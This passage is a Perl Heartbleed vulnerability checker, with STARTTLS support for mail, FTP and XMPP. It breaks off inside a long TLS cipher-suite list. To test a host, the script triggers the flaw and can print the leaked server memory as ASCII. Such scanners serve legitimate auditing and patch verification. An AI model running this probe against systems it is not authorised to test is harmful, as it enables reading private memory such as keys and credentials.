#!/usr/bin/perl

## =========================== BSD 2 CLAUSE LICENSE ===========================
## Copyright (c) 2014, Daniel Heironimus  <aksfjh at gmail dot com>
## All rights reserved.
## Redistribution and use in source and binary forms, with or without
## modification, are permitted provided that the following conditions are met:
##
## 1. Redistributions of source code must retain the above copyright notice,
## this list of conditions and the following disclaimer.
##
## 2. Redistributions in binary form must reproduce the above copyright notice,
## this list of conditions and the following disclaimer in the documentation
## and/or other materials provided with the distribution.
##
## THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS"
## AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE
## IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE
## ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT HOLDER OR CONTRIBUTORS BE
## LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR
## CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF
## SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS
## INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN
## CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE)
## ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF
## THE POSSIBILITY OF SUCH DAMAGE.

## Thanks to:
## Neel Mehta - Vulnerability discovery
## Riku - Vulnerability discovery
## Antti - Vulnerability discovery
## Matti - Vulnerability discovery
## Critical Watch research team - Test sites and consultation

## This script is based on code written by:
## Jared Stafford <jspenguin[at]jspenguin.org> - Original Proof of Concept
## FiloSottile - Go tool
## Christian Mehlmauer - Metasploit module
## wvu - Metasploit module
## juan vazquez - Metasploit module
## Sebastiano Di Paola - Metasploit module

## Update April 17, 2014: Addressed bugs brought up by Shannon Simpson
## and Adrian Hayter
## Blog published April 14, 2014
## http://www.hut3.net/blog/

use strict;
use warnings;
use Getopt::Std;
use IO::Socket;

my $debug_level = 0;
my %opts        = ();
getopt( 'hpod', \%opts );
if ( notnull( $opts{'d'} ) and $opts{'d'} =~ /(\d+)/ ) {
    $debug_level = $1;
}
else{
    $debug_level = -1;
}
start_check(%opts);
exit(0);

### End Main ###

sub start_check {
    my %Options = @_;
    my $sock;

    if ( isnull( $Options{'h'} ) ) {
        debug( 0, "Error - No IP specified" );
        return;
    }
    if ( isnull( $Options{'p'} ) ) {
        debug( 1, "No Port specified, defaulting to 443" );
        $Options{'p'} = 443;
    }
    my $ssltls = 0;
    while ( $ssltls < 3 ) {
        eval { $sock = getSocket( $Options{'h'}, $Options{'p'} ); };
        if ($@) {
            debug( 0, "Error - Couldn't create socket: " . $@ );
            return;
        }

        my $data;

        if ( notnull( $Options{'o'} ) ) {
            if ( !tls_check( $sock, $Options{'o'} ) ) {
                debug( 0, "Start TLS failed" );
                return;
            }
        }

        my $hello     = buildHello($ssltls);
        my $heartbeat = buildHeartbeat($ssltls);

        writePacket( $sock, $hello );
        if ( !readSSL($sock) ) {
            debug( 1, "SSL Hello - Cannot establish connection" );
            close $sock;
            $ssltls++;
            next;
        }
        debug( 2, "Starting heartbeat request" );
        writePacket( $sock, $heartbeat );

        if ( readSSL($sock) ) {
            print $Options{'h'} . q{:}
                . $Options{'p'}
                . ( $Options{'o'} ? $Options{'o'} : q{} )
                . q{ VULNERABLE} . "\n";
            return;
        }
        $ssltls++;
        close $sock;
    }
    print "SAFE\n";
}    # END start_check

sub writePacket {
    my ( $socket, $buffer ) = @_;
    my $buff_len = length $buffer;
    debug( 3, "writing $buff_len bytes to socket" );
    my $count = syswrite( $socket, $buffer, $buff_len );

    if ( $count != $buff_len ) {
        debug( 0, "Error - syswrite failed" );
        return;
    }
    debug( 3, "Write - wrote $count bytes to socket" );
}    # END writePacket

sub readPacket {
    my ( $socket, $length ) = @_;
    my $time = time();
    my $timeout = 30;
    if ( !$length ) {
        $length  = 1048576;
        $timeout = 20;
    }
    my ( $buffer, $data ) = q{} x 2;

    eval {
        local $SIG{ALRM} = sub {
            if ($data) { die $data; }
            die;
        };
        while ( !$data or length $data < $length ) {
            alarm 1;
            sysread( $socket, $buffer, 1 );
            $data .= $buffer;
            if(time() - $time > $timeout or !$data){ last; }
        }
        alarm 0;
    };
    if ( !$data ) {
        debug( 2, "0 bytes read from socket" );
        return '\0';
    }
    debug( 2, length($data) . " bytes read from socket" );
    my $temp = unpack( "H*", $data );
    $temp =~ s/((?:\w\w){16})/$1\n/g;
    $temp =~ s/(\w\w)/$1 /g;
    debug( 6, $temp );
    return $data;
}    # END readPacket

sub getSocket {
    my ( $host, $port ) = @_;
    if ($port) {
        $port =~ s/.*?(\d+).*?/$1/;
    }
    if ( !$port or !$host ) {
        debug( 0, "Error - No host and/or port" );
        return;
    }
    debug( 2, "Creating socket to $host:$port" );
    socket( my $socket, AF_INET, SOCK_STREAM, 0 )
        or die("Can't create socket");

    connect( $socket, pack_sockaddr_in( $port, inet_aton($host) ) )
        or die("Can't connect to socket");
    debug( 2, "Connection successful" );
    return $socket;
}    # END getSocket

sub tls_check {
    my ( $sock, $proto ) = @_;
    $proto =~ s/\s//g;
    my $data = q{};
    if ( !$sock ) {
        debug( 0, "Error - TLS - No socket" );
        return;
    }
    if ( !$proto ) {
        debug( 0, "Error - TLS - No TLS protocol specified" );
        return;
    }
    debug( 2, "Starting TLS connection - $proto" );
    my %request = (
        smtp  => "STARTTLS\r\n",
        ftp   => "AUTH TLS\r\n",
        imap  => "a001 STARTTLS\r\n",
        pop3  => "STLS\r\n",
        xmpp1 => "\<stream:stream xmlns=\'jabber:client\' "
            . "xmlns:stream=\'http://etherx.jabber.org/streams\' "
            . "version=\'1.0\' ",
        xmpp2 => "\<starttls xmlns=\'urn:ietf:params:xml:ns:xmpp-tls\'\/\>",
    );
    if ( $proto =~ m/^ftp$/i ) {
        $data = readPacket($sock);
        debug( 3, "TLS Greeting - $data" );
        if ( !$data or $data !~ m/^234\s/i ) {
            debug( 1, "Error - FTP SSL Failed" );
            return;
        }
        writePacket( $sock, pack( "a*", $request{ftp} ) );
        $data = readPacket($sock);
        debug( 3, "TLS Acknowledgement - $data" );
        if ( !$data or $data !~ m/^220\s/i ) {
            debug( 1, "Error - FTP SSL Failed - Wrong request?" );
            return;
        }
    }
    elsif ( $proto =~ m/^smtp$/i ) {
        $data = readPacket($sock);
        chomp $data;
        debug( 3, "TLS Greeting - $data" );
        if ( !$data or $data !~ m/^220\s/i ) {
            debug( 1, "Error - SMTP SSL Failed" );
            return;
        }
        writePacket( $sock, pack( "a*", $request{smtp} ) );
        $data = readPacket($sock);
        debug( 3, "TLS Acknowledgement - $data" );
        if ( !$data or $data !~ m/^220\s/i ) {
            debug( 1, "Error - SMTP SSL Failed - Wrong request?" );
            return;
        }
    }
    elsif ( $proto =~ m/^pop3$/i ) {
        $data = readPacket($sock);
        debug( 3, "TLS Greeting - $data" );
        if ( !$data or $data !~ m/\+OK/i ) {
            debug( 1, "Error - POP3 SSL Failed" );
            return;
        }
        writePacket( $sock, pack( "a*", $request{pop3} ) );
        $data = readPacket($sock);
        debug( 3, "TLS Acknowledgement - $data" );
        if ( !$data or $data !~ m/\+OK/i ) {
            debug( 1, "Error - POP3 SSL Failed - Wrong request?" );
            return;
        }
    }
    elsif ( $proto =~ m/^imap$/i ) {
        $data = readPacket($sock);
        debug( 3, "TLS Greeting - $data" );
        if ( !$data or $data !~ m/\*\s/i ) {
            debug( 1, "Error - IMAP SSL Failed" );
            return;
        }
        writePacket( $sock, pack( "a*", $request{imap} ) );
        $data = readPacket($sock);
        debug( 3, "TLS Acknowledgement - $data" );
        if ( !$data or $data !~ m/a001\sOK/i ) {
            debug( 1, "Error - IMAP SSL Failed - Wrong request?" );
            return;
        }
    }
    elsif ( $proto =~ m/^xmpp|jabber$/i ) {
        $data = readPacket($sock);
        debug( 3, "TLS Greeting - $data" );
        if ( !$data or $data !~ m/\sfrom\=\'([\w\.])\'\s/i ) {
            debug( 1, "Error - XMPP SSL Failed" );
            return;
        }
        if ( $data =~ m/from\=\'(.*?)\'/i ) {
            $request{'xmpp'} .= "to=\'$1\'\>";
        }
        writePacket( $sock, pack( "a*", $request{xmpp1} ) );
        $data = readPacket($sock);
        debug( 3, "TLS Acknowledgement - $data" );
        if (  !$data
            or $data
            !~ m/\<starttls xmlns=[\'\"]urn:ietf:params:xml:ns:xmpp-tls[\'\"]/i
            )
        {
            debug( 1, "Error - XMPP SSL Failed - Wrong request?" );
            return;
        }
        writePacket( $sock, pack( "a*", $request{xmpp2} ) );
        debug( 3, "TLS Acknowledgement - $data" );
        if ( !$data or $data !~ m/\<proceed/i ) {
            debug( 1, "Error - XMPP SSL Failed - Wrong request?" );
            return;
        }
    }
    else {
        debug( 1, "Unknown TLS service, trying default https" );
        return 1;
    }
    return 1;
}    # END tls_check

sub readSSL {
    my $sock       = shift @_;
    my $payload    = shift @_;
    my $hello_done = pack( "H*", '0e000000' );
    my ( $data, $type, $header, $tls_ver, $data_length, $data_left )
        = q{} x 6;
    $header = readPacket( $sock, 5 );
    if ( !$header ) {
        debug( 0, "Error - Server did not reply" );
    }
    if ( length $header < 5 ) {
        if ( '101110000110000' eq $header ) {
            debug( 1, "Connection closed by server" );
        }
        elsif(length $header > 0) { debug( 0, "Error - Non SSL header returned" ); }
        else{
            debug(0, "No response from server");
        }
        return;
    }
    $type        = unpack( "C*", substr( $header, 0, 1 ) );
    $tls_ver     = unpack( "H*", substr( $header, 1, 2 ) );
    $data_length = unpack( "n*", substr( $header, 3, 2 ) );
    $data_left   = $data_length;
    debug( 3, "Type - $type" );
    debug( 3, "TLS Version - $tls_ver" );
    debug( 3, "Data Length - $data_length" );

    if ( $type == 21 ) {
        $data = readPacket( $sock, $data_length );
        close $sock;
        debug( 1,
                  "Error - SSL Alert - "
                . unpack( "C*", substr( $data, 0, 1 ) ) . " - "
                . unpack( "C*", substr( $data, 1, 1 ) ) );
        
        return 0;
    }
    if ( $type == 22 ) {
        $header = readPacket( $sock, 4 );
        $data_left -= 4;
        if ( unpack( "C*", substr( $header, 0, 1 ) ) != 2 ) {
            return 0;
        }
        $data_length = unpack( "n*", substr( $header, 2, 2 ) );
        $data = readPacket( $sock, $data_length );
        $data_left -= $data_length;
        $header = readPacket( $sock, 5 );
        while ( $header and length $header > 4 ) {
            $type        = unpack( "C*", substr( $header, 0, 1 ) );
            $tls_ver     = unpack( "H*", substr( $header, 1, 2 ) );
            $data_length = unpack( "n*", substr( $header, 3, 2 ) );
            $data_left = ( $data_left ? $data_left - 5 : $data_length );
            debug( 3, "Type - $type" );
            debug( 3, "TLS Version - $tls_ver" );
            debug( 3, "Data Length - $data_length" );
            $data = readPacket( $sock, $data_length );

            if ( $data_length <= $data_left ) {
                $data = readPacket( $sock, $data_length );
                $data_left -= $data_length;
            }
            elsif(substr($data, -4, 4) ne $hello_done) {
                debug( 2,
                    "Unknown reply, clearing buffer and attempting to recover"
                );
                $data = readPacket( $sock, $data_left );
                $data = substr( $data, -4, 4 );
            }
            if ( $data eq $hello_done
                or substr( $data, -4, 4 ) eq $hello_done )
            {
                debug( 3, "Server hello complete" );
                last;
            }

            $header = readPacket( $sock, 5 );
        }
    }
    elsif ( $type == 24 ) {
        $data = readPacket( $sock, $data_length );
        if ( $data_length <= 1 ) {
            debug( 2, "Heartbeat - Not vulnerable?" );
            return 0;
        }
        $data = unpack( "H*", $data );
        $data =~ s/(\w\w)/$1 /g;
        my $ascii = q{};
        foreach my $hex ( split( /\s/, $data ) ) {
            if ( hex($hex) > 31 and hex($hex) < 127 ) {
                $ascii .= chr( hex($hex) );
                next;
            }
            $ascii .= '.';
        }
        debug( 3, "Heartbeat - ASCII data - $ascii" );
        if ( $ascii =~ /bowties are cool/i ) {
            debug( 2, "Heartbeat - Found implanted data" );
        }
    }
    else {
        return 0;
    }
    return 1;
}    # END readSSL

sub buildHello {
    ### Note: Data is gathered as hex and then packed
    my $ssltls = shift @_;

    my @ciphers = (    # Cipher list, 64 bit (8 byte) identifiers
        '0000',        # TLS_NULL_WITH_NULL_NULL
        '0001',        # TLS_RSA_WITH_NULL_MD5
        '0002',        # TLS_RSA_WITH_NULL_SHA
        '0003',        # TLS_RSA_EXPORT_WITH_RC4_40_MD5
        '0004',        # TLS_RSA_WITH_RC4_128_MD5
        '0005',        # TLS_RSA_WITH_RC4_128_SHA
        '0006',        # TLS_RSA_EXPORT_WITH_RC2_CBC_40_MD5
        '0007',        # TLS_RSA_WITH_IDEA_CBC_SHA
        '0008',        # TLS_RSA_EXPORT_WITH_DES40_CBC_SHA
        '0009',        # TLS_RSA_WITH_DES_CBC_SHA
        '000A',        # TLS_RSA_WITH_3DES_EDE_CBC_SHA
        '000B',        # TLS_DH_DSS_EXPORT_WITH_DES40_CBC_SHA
        '000C',        # TLS_DH_DSS_WITH_DES_CBC_SHA
        '000D',        # TLS_DH_DSS_WITH_3DES_EDE_CBC_SHA
        '000E',        # TLS_DH_RSA_EXPORT_WITH_DES40_CBC_SHA
        '000F',        # TLS_DH_RSA_WITH_DES_CBC_SHA
        '0010',        # TLS_DH_RSA_WITH_3DES_EDE_CBC_SHA
        '0011',        # TLS_DHE_DSS_EXPORT_WITH_DES40_CBC_SHA
        '0012',        # TLS_DHE_DSS_WITH_DES_CBC_SHA
        '0013',        # TLS_DHE_DSS_WITH_3DES_EDE_CBC_SHA
        '0014',        # TLS_DHE_RSA_EXPORT_WITH_DES40_CBC_SHA
        '0015',        # TLS_DHE_RSA_WITH_DES_CBC_SHA
        '0016',        # TLS_DHE_RSA_WITH_3DES_EDE_CBC_SHA
        '0017',        # TLS_DH_anon_EXPORT_WITH_RC4_40_MD5
        '0018',        # TLS_DH_anon_WITH_RC4_128_MD5
        '0019',        # TLS_DH_anon_EXPORT_WITH_DES40_CBC_SHA
        '001A',        # TLS_DH_anon_WITH_DES_CBC_SHA
        '001B',        # TLS_DH_anon_WITH_3DES_EDE_CBC_SHA
        '001E',        # TLS_KRB5_WITH_DES_CBC_SHA
        '001F',        # TLS_KRB5_WITH_3DES_EDE_CBC_SHA
        '0020',        # TLS_KRB5_WITH_RC4_128_SHA
        '0021',        # TLS_KRB5_WITH_IDEA_CBC_SHA
        '0022',        # TLS_KRB5_WITH_DES_CBC_MD5
        '0023',        # TLS_KRB5_WITH_3DES_EDE_CBC_MD5
        '0024',        # TLS_KRB5_WITH_RC4_128_MD5
        '0025',        # TLS_KRB5_WITH_IDEA_CBC_MD5
        '0026',        # TLS_KRB5_EXPORT_WITH_DES_CBC_40_SHA
        '0027',        # TLS_KRB5_EXPORT_WITH_RC2_CBC_40_SHA
        '0028',        # TLS_KRB5_EXPORT_WITH_RC4_40_SHA
        '0029',        # TLS_KRB5_EXPORT_WITH_DES_CBC_40_MD5
        '002A',        # TLS_KRB5_EXPORT_WITH_RC2_CBC_40_MD5
        '002B',        # TLS_KRB5_EXPORT_WITH_RC4_40_MD5
        '002C',        # TLS_PSK_WITH_NULL_SHA
        '002D',        # TLS_DHE_PSK_WITH_NULL_SHA
        '002E',        # TLS_RSA_PSK_WITH_NULL_SHA
        '002F',        # TLS_RSA_WITH_AES_128_CBC_SHA
        '0030',        # TLS_DH_DSS_WITH_AES_128_CBC_SHA
        '0031',        # TLS_DH_RSA_WITH_AES_128_CBC_SHA
        '0032',        # TLS_DHE_DSS_WITH_AES_128_CBC_SHA
        '0033',        # TLS_DHE_RSA_WITH_AES_128_CBC_SHA
        '0034',        # TLS_DH_anon_WITH_AES_128_CBC_SHA
        '0035',        # TLS_RSA_WITH_AES_256_CBC_SHA
        '0036',        # TLS_DH_DSS_WITH_AES_256_CBC_SHA
        '0037',        # TLS_DH_RSA_WITH_AES_256_CBC_SHA
        '0038',        # TLS_DHE_DSS_WITH_AES_256_CBC_SHA
        '0039',        # TLS_DHE_RSA_WITH_AES_256_CBC_SHA
        '003A',        # TLS_DH_anon_WITH_AES_256_CBC_SHA
        '003B',        # TLS_RSA_WITH_NULL_SHA256
        '003C',        # TLS_RSA_WITH_AES_128_CBC_SHA256
        '003D',        # TLS_RSA_WITH_AES_256_CBC_SHA256
        '003E',        # TLS_DH_DSS_WITH_AES_128_CBC_SHA256
        '003F',        # TLS_DH_RSA_WITH_AES_128_CBC_SHA256
        '0040',        # TLS_DHE_DSS_WITH_AES_128_CBC_SHA256
        '0041',        # TLS_RSA_WITH_CAMELLIA_128_CBC_SHA
        '0042',        # TLS_DH_DSS_WITH_CAMELLIA_128_CBC_SHA
        '0043',        # TLS_DH_RSA_WITH_CAMELLIA_128_CBC_SHA
        '0044',        # TLS_DHE_DSS_WITH_CAMELLIA_128_CBC_SHA
        '0045',        # TLS_DHE_RSA_WITH_CAMELLIA_128_CBC_SHA
        '0046',        # TLS_DH_anon_WITH_CAMELLIA_128_CBC_SHA
        '0067',        # TLS_DHE_RSA_WITH_AES_128_CBC_SHA256
        '0068',        # TLS_DH_DSS_WITH_AES_256_CBC_SHA256
        '0069',        # TLS_DH_RSA_WITH_AES_256_CBC_SHA256
        '006A',        # TLS_DHE_DSS_WITH_AES_256_CBC_SHA256
        '006B',        # TLS_DHE_RSA_WITH_AES_256_CBC_SHA256
        '006C',        # TLS_DH_anon_WITH_AES_128_CBC_SHA256
        '006D',        # TLS_DH_anon_WITH_AES_256_CBC_SHA256
        '0084',        # TLS_RSA_WITH_CAMELLIA_256_CBC_SHA
        '0085',        # TLS_DH_DSS_WITH_CAMELLIA_256_CBC_SHA
        '0086',        # TLS_DH_RSA_WITH_CAMELLIA_256_CBC_SHA
        '0087',        # TLS_DHE_DSS_WITH_CAMELLIA_256_CBC_SHA
        '0088',        # TLS_DHE_RSA_WITH_CAMELLIA_256_CBC_SHA
        '0089',        # TLS_DH_anon_WITH_CAMELLIA_256_CBC_SHA
        '008A',        # TLS_PSK_WITH_RC4_128_SHA
        '008B',        # TLS_PSK_WITH_3DES_EDE_CBC_SHA
        '008C',        # TLS_PSK_WITH_AES_128_CBC_SHA
        '008D',        # TLS_PSK_WITH_AES_256_CBC_SHA
        '008E',        # TLS_DHE_PSK_WITH_RC4_128_SHA
        '008F',        # TLS_DHE_PSK_WITH_3DES_EDE_CBC_SHA
        '0090',        # TLS_DHE_PSK_WITH_AES_128_CBC_SHA
        '0091',        # TLS_DHE_PSK_WITH_AES_256_CBC_SHA
        '0092',        # TLS_RSA_PSK_WITH_RC4_128_SHA
        '0093',        # TLS_RSA_PSK_WITH_3DES_EDE_CBC_SHA
        '0094',        # TLS_RSA_PSK_WITH_AES_128_CBC_SHA
        '0095',        # TLS_RSA_PSK_WITH_AES_256_CBC_SHA
        '0096',        # TLS_RSA_WITH_SEED_CBC_SHA
        '0097',        # TLS_DH_DSS_WITH_SEED_CBC_SHA
        '0098',        # TLS_DH_RSA_WITH_SEED_CBC_SHA
        '0099',        # TLS_DHE_DSS_WITH_SEED_CBC_SHA
        '009A',        # TLS_DHE_RSA_WITH_SEED_CBC_SHA
        '009B',        # TLS_DH_anon_WITH_SEED_CBC_SHA
        '009C',        # TLS_RSA_WITH_AES_128_GCM_SHA256
        '009D',        # TLS_RSA_WITH_AES_256_GCM_SHA384
        '009E',        # TLS_DHE_RSA_WITH_AES_128_GCM_SHA256
        '009F',        # TLS_DHE_RSA_WITH_AES_256_GCM_SHA384
        '00A0',        # TLS_DH_RSA_WITH_AES_128_GCM_SHA256
        '00A1',        # TLS_DH_RSA_WITH_AES_256_GCM_SHA384
        '00A2',        # TLS_DHE_DSS_WITH_AES_128_GCM_SHA256
        '00A3',        # TLS_DHE_DSS_WITH_AES_256_GCM_SHA384
        '00A4',        # TLS_DH_DSS_WITH_AES_128_GCM_SHA256
        '00A5',        # TLS_DH_DSS_WITH_AES_256_GCM_SHA384
        '00A6',        # TLS_DH_anon_WITH_AES_128_GCM_SHA256
        '00A7',        # TLS_DH_anon_WITH_AES_256_GCM_SHA384
        '00A8',        # TLS_PSK_WITH_AES_128_GCM_SHA256
        '00A9',        # TLS_PSK_WITH_AES_256_GCM_SHA384
        '00AA',        # TLS_DHE_PSK_WITH_AES_128_GCM_SHA256
        '00AB',        # TLS_DHE_PSK_WITH_AES_256_GCM_SHA384
        '00AC',        # TLS_RSA_PSK_WITH_AES_128_GCM_SHA256
        '00AD',        # TLS_RSA_PSK_WITH_AES_256_GCM_SHA384
        '00AE',        # TLS_PSK_WITH_AES_128_CBC_SHA256
        '00AF',        # TLS_PSK_WITH_AES_256_CBC_SHA384
        '00B0',        # TLS_PSK_WITH_NULL_SHA256
        '00B1',        # TLS_PSK_WITH_NULL_SHA384
        '00B2',        # TLS_DHE_PSK_WITH_AES_128_CBC_SHA256
        '00B3',        # TLS_DHE_PSK_WITH_AES_256_CBC_SHA384
        '00B4',        # TLS_DHE_PSK_WITH_NULL_SHA256
        '00B5',        # TLS_DHE_PSK_WITH_NULL_SHA384
        '00B6',        # TLS_RSA_PSK_WITH_AES_128_CBC_SHA256
        '00B7',        # TLS_RSA_PSK_WITH_AES_256_CBC_SHA384
        '00B8',        # TLS_RSA_PSK_WITH_NULL_SHA256
        '00B9',        # TLS_RSA_PSK_WITH_NULL_SHA384
        '00BA',        # TLS_RSA_WITH_CAMELLIA_128_CBC_SHA256
        '00BB',        # TLS_DH_DSS_WITH_CAMELLIA_128_CBC_SHA256
        '00BC',        # TLS_DH_RSA_WITH_CAMELLIA_128_CBC_SHA256
        '00BD',        # TLS_DHE_DSS_WITH_CAMELLIA_128_CBC_SHA256
        '00BE',        # TLS_DHE_RSA_WITH_CAMELLIA_128_CBC_SHA256
        '00BF',        # TLS_DH_anon_WITH_CAMELLIA_128_CBC_SHA256
        '00C0',        # TLS_RSA_WITH_CAMELLIA_256_CBC_SHA256
        '00C1',        # TLS_DH_DSS_WITH_CAMELLIA_256_CBC_SHA256
        '00C2',        # TLS_DH_RSA_WITH_CAMELLIA_256_CBC_SHA256
        '00C3',        # TLS_DHE_DSS_WITH_CAMELLIA_256_CBC_SHA256
        '00C4',        # TLS_DHE_RSA_WITH_CAMELLIA_256_CBC_SHA256
        '00C5',        # TLS_DH_anon_WITH_CAMELLIA_256_CBC_SHA256
        '00FF',        # TLS_EMPTY_RENEGOTIATION_INFO_SCSV
        'C001',        # TLS_ECDH_ECDSA_WITH_NULL_SHA
        'C002',        # TLS_ECDH_ECDSA_WITH_RC4_128_SHA
        'C003',        # TLS_ECDH_ECDSA_WITH_3DES_EDE_CBC_SHA
        'C004',        # TLS_ECDH_ECDSA_WITH_AES_128_CBC_SHA
        'C005',        # TLS_ECDH_ECDSA_WITH_AES_256_CBC_SHA
        'C006',        # TLS_ECDHE_ECDSA_WITH_NULL_SHA
        'C007',        # TLS_ECDHE_ECDSA_WITH_RC4_128_SHA
        'C008',        # TLS_ECDHE_ECDSA_WITH_3DES_EDE_CBC_SHA
        'C009',        # TLS_ECDHE_ECDSA_WITH_AES_128_CBC_SHA
        'C00A',        # TLS_ECDHE_ECDSA_WITH_AES_256_CBC_SHA
        'C00B',        # TLS_ECDH_RSA_WITH_NULL_SHA
        'C00C',        # TLS_ECDH_RSA_WITH_RC4_128_SHA
        'C00D',        # TLS_ECDH_RSA_WITH_3DES_EDE_CBC_SHA
        'C00E',        # TLS_ECDH_RSA_WITH_AES_128_CBC_SHA
        'C00F',        # TLS_ECDH_RSA_WITH_AES_256_CBC_SHA
        'C010',        # TLS_ECDHE_RSA_WITH_NULL_SHA
        'C011',        # TLS_ECDHE_RSA_WITH_RC4_128_SHA
        'C012',        # TLS_ECDHE_RSA_WITH_3DES_EDE_CBC_SHA
        'C013',        # TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA
        'C014',        # TLS_ECDHE_RSA_WITH_AES_256_CBC_SHA
        'C015',        # TLS_ECDH_anon_WITH_NULL_SHA
        'C016',        # TLS_ECDH_anon_WITH_RC4_128_SHA
        'C017',        # TLS_ECDH_anon_WITH_3DES_EDE_CBC_SHA
        'C018',        # TLS_ECDH_anon_WITH_AES_128_CBC_SHA
        'C019',        # TLS_ECDH_anon_WITH_AES_256_CBC_SHA
        'C01A',        # TLS_SRP_SHA_WITH_3DES_EDE_CBC_SHA
        'C01B',        # TLS_SRP_SHA_RSA_WITH_3DES_EDE_CBC_SHA
        'C01C',        # TLS_SRP_SHA_DSS_WITH_3DES_EDE_CBC_SHA
        'C01D',        # TLS_SRP_SHA_WITH_AES_128_CBC_SHA
        'C01E',        # TLS_SRP_SHA_RSA_WITH_AES_128_CBC_SHA
        'C01F',        # TLS_SRP_SHA_DSS_WITH_AES_128_CBC_SHA
        'C020',        # TLS_SRP_SHA_WITH_AES_256_CBC_SHA
        'C021',        # TLS_SRP_SHA_RSA_WITH_AES_256_CBC_SHA
        'C022',        # TLS_SRP_SHA_DSS_WITH_AES_256_CBC_SHA
        'C023',        # TLS_ECDHE_ECDSA_WITH_AES_128_CBC_SHA256
        'C024',        # TLS_ECDHE_ECDSA_WITH_AES_256_CBC_SHA384
        'C025',        # TLS_ECDH_ECDSA_WITH_AES_128_CBC_SHA256
        'C026',        # TLS_ECDH_ECDSA_WITH_AES_256_CBC_SHA384
        'C027',        # TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA256
        'C028',        # TLS_ECDHE_RSA_WITH_AES_256_CBC_SHA384
        'C029',        # TLS_ECDH_RSA_WITH_AES_128_CBC_SHA256
        'C02A',        # TLS_ECDH_RSA_WITH_AES_256_CBC_SHA384
        'C02B',        # TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256
        'C02C',        # TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384
        'C02D',        # TLS_ECDH_ECDSA_WITH_AES_128_GCM_SHA256
        'C02E',        # TLS_ECDH_ECDSA_WITH_AES_256_GCM_SHA384
        'C02F',        # TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256
        'C030',        # TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384
        'C031',        # TLS_ECDH_RSA_WITH_AES_128_GCM_SHA256
        'C032',        # TLS_ECDH_RSA_WITH_AES_256_GCM_SHA384
        'C033',        # TLS_ECDHE_PSK_WITH_RC4_128_SHA
        'C034',        # TLS_ECDHE_PSK_WITH_3DES_EDE_CBC_SHA
        'C035',        # TLS_ECDHE_PSK_WITH_AES_128_CBC_SHA
        'C036',        # TLS_ECDHE_PSK_WITH_AES_256_CBC_SHA
        'C037',        # TLS_ECDHE_PSK_WITH_AES_128_CBC_SHA256
        'C038',        # TLS_ECDHE_PSK_WITH_AES_256_CBC_SHA384
        'C039',        # TLS_ECDHE_PSK_WITH_NULL_SHA
        'C03A',        # TLS_ECDHE_PSK_WITH_NULL_SHA256
        'C03B',        # TLS_ECDHE_PSK_WITH_NULL_SHA384
        'C03C',        # TLS_RSA_WITH_ARIA_128_CBC_SHA256
        'C03D',        # TLS_RSA_WITH_ARIA_256_CBC_SHA384
        'C03E',        # TLS_DH_DSS_WITH_ARIA_128_CBC_SHA256
        'C03F',        # TLS_DH_DSS_WITH_ARIA_256_CBC_SHA384
        'C040',        # TLS_DH_RSA_WITH_ARIA_128_CBC_SHA256
        'C041',        # TLS_DH_RSA_WITH_ARIA_256_CBC_SHA384
        'C042',        # TLS_DHE_DSS_WITH_ARIA_128_CBC_SHA256
        'C043',        # TLS_DHE_DSS_WITH_ARIA_256_CBC_SHA384
        'C044',        # TLS_DHE_RSA_WITH_ARIA_128_CBC_SHA256
        'C045',        # TLS_DHE_RSA_WITH_ARIA_256_CBC_SHA384
        'C046',        # TLS_DH_anon_WITH_ARIA_128_CBC_SHA256
        'C047',        # TLS_DH_anon_WITH_ARIA_256_CBC_SHA384
        'C048',        # TLS_ECDHE_ECDSA_WITH_ARIA_128_CBC_SHA256
        'C049',        # TLS_ECDHE_ECDSA_WITH_ARIA_256_CBC_SHA384
        'C04A',        # TLS_ECDH_ECDSA_WITH_ARIA_128_CBC_SHA256
        'C04B',        # TLS_ECDH_ECDSA_WITH_ARIA_256_CBC_SHA384
        'C04C',        # TLS_ECDHE_RSA_WITH_ARIA_128_CBC_SHA256
        'C04D',        # TLS_ECDHE_RSA_WITH_ARIA_256_CBC_SHA384
        'C04E',        # TLS_ECDH_RSA_WITH_ARIA_128_CBC_SHA256
        'C04F',        # TLS_ECDH_RSA_WITH_ARIA_256_CBC_SHA384
        'C050',        # TLS_RSA_WITH_ARIA_128_GCM_SHA256
        'C051',        # TLS_RSA_WITH_ARIA_256_GCM_SHA384
        'C052',        # TLS_DHE_RSA_WITH_ARIA_128_GCM_SHA256
        'C053',        # TLS_DHE_RSA_WITH_ARIA_256_GCM_SHA384
        'C054',        # TLS_DH_RSA_WITH_ARIA_128_GCM_SHA256
        'C055',        # TLS_DH_RSA_WITH_ARIA_256_GCM_SHA384
        'C056',        # TLS_DHE_DSS_WITH_ARIA_128_GCM_SHA256
        'C057',        # TLS_DHE_DSS_WITH_ARIA_256_GCM_SHA384
        'C058',        # TLS_DH_DSS_WITH_ARIA_128_GCM_SHA256
        'C059',        # TLS_DH_DSS_WITH_ARIA_256_GCM_SHA384
        'C05A',        # TLS_DH_anon_WITH_ARIA_128_GCM_SHA256
        'C05B',        # TLS_DH_anon_WITH_ARIA_256_GCM_SHA384
        'C05C',        # TLS_ECDHE_ECDSA_WITH_ARIA_128_GCM_SHA256
        'C05D',        # TLS_ECDHE_ECDSA_WITH_ARIA_256_GCM_SHA384
        'C05E',        # TLS_ECDH_ECDSA_WITH_ARIA_128_GCM_SHA256
        'C05F',        # TLS_ECDH_ECDSA_WITH_ARIA_256_GCM_SHA384
